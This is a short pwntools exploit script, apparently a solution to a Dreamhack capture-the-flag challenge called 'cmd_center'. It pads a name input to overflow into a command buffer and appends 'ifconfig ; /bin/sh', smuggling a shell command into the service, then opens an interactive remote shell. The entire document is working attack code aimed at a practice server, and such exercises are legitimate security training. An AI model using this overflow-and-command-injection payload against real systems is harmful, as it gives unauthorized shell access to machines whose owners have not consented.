from pwn import *

exe = ELF('cmd_center', checksec=False)
#r = process(exe.path)
r = remote('host3.dreamhack.games', 12057)

payload = b'a'*(0x130 - 0x110)
payload += b'ifconfig ; /bin/sh'
r.sendafter(b'name: ', payload)
r.interactive()